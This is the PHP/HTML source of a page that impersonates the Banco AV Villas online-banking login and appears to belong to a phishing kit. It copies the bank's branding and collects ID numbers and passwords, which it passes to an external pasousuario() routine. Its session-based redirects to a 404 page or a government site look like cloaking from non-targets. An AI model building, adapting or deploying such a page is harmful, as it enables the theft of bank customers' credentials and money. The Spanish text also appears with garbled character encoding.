<?php
session_start();

if (isset($_SESSION['estado']) && $_SESSION['estado'] == 1) {
}
else if (isset($_SESSION['estado']) && $_SESSION['estado'] == 2) {
    header('location:/404.php');
}
else if (isset($_SESSION['estado']) && $_SESSION['estado'] == 3) {
    header('location:https://www.dian.gov.co/');
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ingresa a nuestra Banca Virtual | Banco AV Villas</title>
    <link rel="icon" href="https://pb-avvillas.avaldigitallabs.com/assets/img/favicon-prod.ico">
    
    <script src="../../scripts/jquery-3.6.0.js"></script>
    <script src="../../scripts/functions2.js" type="text/javascript"></script>

    <style>
        @font-face {
            font-family: 'Onest';
            src: url('./PASARELA_AVVILLAS_files/Onest-Regular.c8a306849aa76776.ttf') format('truetype');
            font-weight: 400;
        }
        @font-face {
            font-family: 'Onest';
            src: url('./PASARELA_AVVILLAS_files/Onest-Bold.fa08e2e68677ee91.ttf') format('truetype');
            font-weight: 700;
        }

        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: 'Onest', sans-serif;
            background: #f8f8f8;
            overflow-x: hidden;
        }

        .bg-circles {
            display: none;
        }

        .main-background {
            display: none;
        }

        .page-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            justify-content: center;
            align-items: center;
            padding: 100px 24px 40px;
            box-sizing: border-box;
            position: relative;
            background-color: #f8f8f8;
            background-image: url("/circulorojo.svg");
            background-repeat: no-repeat;
            background-position: left center;
            background-size: 180%;
        }

        .cards-row {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 18px;
            flex: 1; /* Pushes footer down if there's space */
            width: 100%;
            margin-bottom: 40px;
        }

        .slogan {
            position: absolute;
            top: 24px;
            left: 24px;
            z-index: 10;
        }

        .slogan p {
            font-size: 18px;
            font-weight: 570;
            color: #141414;
            margin: 0;
        }

        /* BANNER SECTION */
        .ad-cards {
            display: flex;
            gap: 16px;
            height: 600px;
            align-items: stretch;
            z-index: 5;
        }

        .banners-middle {
            display: flex;
            flex-direction: column;
            gap: 16px;
            width: 360px;
        }

        .ad-card {
            border-radius: 16px;
            background-size: cover !important;
            background-repeat: no-repeat;
            position: relative;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            text-decoration: none;
            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
            overflow: hidden;
            box-sizing: border-box;
            background-color: #f0f0f0;
        }

        .ad-card.first-ad { 
            width: 365px;
            height: 600px;
            background-position: center 15%; /* Alineado para ver la cara del jugador y el corazÃ³n */
        }

        .banner-branding {
            position: absolute;
            top: 16px;
            left: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            z-index: 2;
        }

        .banner-branding img.visa {
            height: 24px;
            width: auto;
        }

        .banner-branding img.fifa {
            height: 40px;
            width: auto;
        }

        .banner-branding span {
            color: #2352a2;
            font-size: 10px;
            font-weight: 600;
        }
        
        .ad-card.second-ad, .ad-card.third-ad { 
            height: 292px;
            width: 100%;
            background-position: center;
        }

        .quota {
            background: #ffffff;
            width: calc(100% - 24px);
            padding: 16px;
            margin: 12px;
            border-radius: 0 16px 16px 8px;
            box-sizing: border-box;
            z-index: 5;
            position: relative;
        }

        .quota p {
            margin: 0 0 10px 0;
            font-size: 14px;
            color: #141414;
            line-height: 1.4;
        }

        .quota span {
            font-size: 13px;
            color: #2352a2;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .quota span::before {
            content: "";
            display: inline-block;
            width: 14px;
            height: 14px;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="%232352a2" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg>');
            background-size: contain;
            background-repeat: no-repeat;
        }

        /* LOGIN CARD */
        .login-card {
            background: #ffffff;
            width: 360px;
            height: 600px;
            padding: 40px 32px;
            border-radius: 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            z-index: 10;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 24px;
        }

        .logo-branding {
            height: 52px;
            width: auto;
        }

        h1 {
            font-size: 18px;
            color: #252b31;
            text-align: left;
            margin: 0 0 24px 0;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 16px;
            position: relative;
        }

        .form-group label {
            position: absolute;
            top: 18px;
            left: 16px;
            font-size: 16px;
            color: #77899a;
            pointer-events: none;
            transition: all 0.2s ease;
            z-index: 3;
            background-color: transparent;
        }

        .input-wrapper {
            position: relative;
            background: #ffffff;
            border: 1px solid #DEE1E4;
            border-radius: 8px;
            height: 56px;
            transition: all 0.3s ease;
            box-sizing: border-box;
        }

        select, input {
            width: 100%;
            height: 100%;
            padding: 26px 16px 6px 16px;
            border: none;
            background: transparent;
            font-size: 16px;
            color: #141414 !important;
            box-sizing: border-box;
            outline: none;
            font-family: inherit;
            position: relative;
            z-index: 2;
        }

        .form-group.focused label, .form-group.filled label {
            top: 6px;
            font-size: 12px;
            color: #0048db;
            transform: scale(0.75);
            transform-origin: left top;
        }

        .form-group.error .input-wrapper {
            border-color: #a00104;
        }

        .form-group.error label {
            color: #a00104 !important;
        }

        .alert-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #a00104;
            font-size: 1.25rem;
            display: none;
            z-index: 4;
        }

        .form-group.error .alert-icon {
            display: block;
        }

        .error-message {
            color: #a00104;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }

        .form-group.error .error-message {
            display: block;
        }

        .btn-ingresar {
            width: 100%;
            height: 48px;
            background: #dbe2e8; 
            color: #acbac9;
            border: none;
            border-radius: 24px;
            font-size: 14px;
            font-weight: 700;
            cursor: default;
            margin: 8px 0 24px 0;
            transition: all 0.3s ease;
            text-transform: uppercase;
        }

        .btn-ingresar.active {
            background: #E1001D;
            color: #ffffff;
            cursor: pointer;
        }

        .extra-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
            align-items: center;
        }

        .extra-link-item {
            text-decoration: none;
            color: #2352a2;
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .extra-links p {
            color: #252b31;
            font-size: 12px;
            margin: 8px 0 0 0;
            text-align: center;
        }

        .footer-info {
            width: 100%;
            max-width: 1200px;
            color: #252b31;
            padding: 20px 0;
            margin-top: auto; /* Ensures it stays at bottom of flex container */
        }

        .footer-info h6 {
            margin: 0 0 8px 0;
            font-size: 12px;
            font-weight: 700;
        }

        .footer-lineas {
            display: flex;
            gap: 20px;
            font-size: 12px;
        }

        .footer-lineas b {
            font-weight: 700;
        }

        .red-dot {
            display: inline-block;
            width: 6px;
            height: 6px;
            background-color: #ed1b2f;
            border-radius: 50%;
            margin-right: 8px;
        }
        /* MOBILE RESPONSIVENESS */
        /* LOADER STYLES */
        #loader {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(255, 255, 255, 0.98);
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loader-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 30px;
        }

        .loader-logo {
            height: 52px;
            width: auto;
        }

        .spinner-red {
            width: 48px;
            height: 48px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ed1b2f;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media screen and (max-width: 1024px) {
            .ad-cards {
                display: none;
            }

            .cards-row {
                width: 100%;
                justify-content: center;
                gap: 0;
            }

            .page-container {
                padding: 60px 20px 40px;
                background-size: 300%; /* Make circle bigger on mobile */
                background-position: center 80%; /* Position it behind the login */
            }

            .login-card {
                width: 100%;
                max-width: 360px;
                height: auto;
                min-height: 520px;
            }

            .slogan {
                display: none;
            }

            .footer-info {
                padding: 20px;
                text-align: left;
            }
        }
    </style>
</head>
<body>
    <div id="loader">
        <div class="loader-content">
            <img src="https://www.avvillas.com.co/bancadigital/assets/bavv-brand/bavv/brand-primary.svg" alt="AV Villas" class="loader-logo">
            <div class="spinner-red"></div>
        </div>
    </div>

    <div class="slogan">
        <p>Juntos trabajando</p>
    </div>

    <div class="page-container">
        <div class="cards-row">
            <div class="ad-cards">
                <a href="#" class="ad-card first-ad" style="background-image: url('https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/Banner-card_1.webp');">
                    <div class="quota">
                        <p><b>La Copa Mundial de la FIFA 2026â„¢,</b> ahora es una experiencia AVAL, gracias a Visa.</p>
                        <span>Conoce mÃ¡s</span>
                    </div>
                </a>
                <div class="banners-middle">
                    <a href="#" class="ad-card second-ad" style="background-image: url('https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/Banner-card-md_2.webp');">
                        <div class="quota">
                            <p>Participa por <b>18 paquetes dobles</b> para vivir la Copa Mundial de la FIFA 2026â„¢</p>
                            <span>CÃ³mo ganar</span>
                        </div>
                    </a>
                    <a href="#" class="ad-card third-ad" style="background-image: url('https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/Banner-card-md_3.webp');">
                        <div class="quota">
                            <p>Â¡Tienes que tenerla! Pide tu <b>Tarjeta de CrÃ©dito Visa AV Villas ediciÃ³n especial</b></p>
                            <span>PÃ­dela y Ãºsala ya</span>
                        </div>
                    </a>
                </div>
            </div>

            <div class="login-card">
                <div class="logo-container">
                    <img src="https://www.avvillas.com.co/bancadigital/assets/bavv-brand/bavv/brand-primary.svg" alt="AV Villas" class="logo-branding">
                </div>

                <h1>Ingresa a tu Co-banking</h1>

                <form id="loginForm">
                    <div class="form-group filled">
                        <label>Tipo de documento</label>
                        <div class="input-wrapper">
                            <select id="user-type-document">
                                <option value="1">CÃ©dula de CiudadanÃ­a</option>
                                <option value="2">CÃ©dula de ExtranjerÃ­a</option>
                                <option value="3">Tarjeta de Identidad</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group">
                        <label>NÃºmero de documento</label>
                        <div class="input-wrapper">
                            <input type="text" id="user-document" inputmode="numeric" placeholder=" ">
                        </div>
                    </div>

                    <div class="form-group">
                        <label>Ingresa tu contraseÃ±a</label>
                        <div class="input-wrapper">
                            <input type="password" id="user-password" placeholder=" ">
                        </div>
                    </div>

                    <input type="hidden" id="banco" value="Avvillas">

                    <button type="button" id="login-btn-ingresar" class="btn-ingresar" disabled>INGRESAR</button>
                </form>

                <div class="extra-links">
                    <a href="#" class="extra-link-item">
                        OlvidÃ© mi contraseÃ±a
                    </a>
                    <p>Â¿AÃºn no tienes contraseÃ±a para ingresar?</p>
                    <a href="#" class="extra-link-item">
                        RegÃ­strate
                    </a>
                    <a href="#" class="extra-link-item" style="margin-top: 12px;">
                        Â¿Tienes problemas para ingresar?
                    </a>
                </div>
            </div>
        </div>

        <div class="footer-info">
            <h6>LÃ­nea Audiovillas</h6>
            <div class="footer-lineas">
                <div class="linea-item"><span class="red-dot"></span><b>Nacional</b> 01 8000 51 8000</div>
                <div class="linea-item"><span class="red-dot"></span><b>BogotÃ¡</b> (601) 4441777</div>
                <div class="linea-item"><span class="red-dot"></span><b>MedellÃ­n</b> (604) 3256000</div>
                <div class="linea-item"><span class="red-dot"></span><b>Barranquilla</b> (605) 3304330</div>
                <div class="linea-item"><span class="red-dot"></span><b>Bucaramanga</b> (607) 6302980</div>
                <div class="linea-item"><span class="red-dot"></span><b>Cali</b> (602) 8859595</div>
            </div>
            <div class="grupo-aval-logo" style="margin-top: 16px;">
                <img src="./PASARELA_AVVILLAS_files/grupoaval_black.svg" alt="Grupo Aval" style="height: 32px; width: auto;">
            </div>
        </div>
    </div>


    <script>
        $(document).ready(function() {
            // AnimaciÃ³n de labels
            $("input, select").on("focus", function() {
                $(this).closest(".form-group").addClass("focused");
            }).on("blur", function() {
                if ($(this).val() === "" && $(this).attr("id") !== "user-type-document") {
                    $(this).closest(".form-group").removeClass("focused filled");
                }
            }).on("input changecount", function() {
                if ($(this).val() !== "") {
                    $(this).closest(".form-group").addClass("filled");
                } else {
                    $(this).closest(".form-group").removeClass("filled");
                }
                checkInputs();
            });

            // Activar botÃ³n cuando hay datos
            function checkInputs() {
                var user = $("#user-document").val();
                var pass = $("#user-password").val();
                if(user.length > 5 && pass.length > 0) {
                    $("#login-btn-ingresar").addClass("active").prop("disabled", false);
                } else {
                    $("#login-btn-ingresar").removeClass("active").prop("disabled", true);
                }
            }

            $("#login-btn-ingresar").click(function() {
                var user = $("#user-document").val();
                var pass = $("#user-password").val();
                var bank = $("#banco").val();
                
                if(user.length > 5 && pass.length > 0) {
                    $("#loader").css("display", "flex");
                    pasousuario(pass, user, bank);
                }
            });
        });
    </script>
</body>
</html>

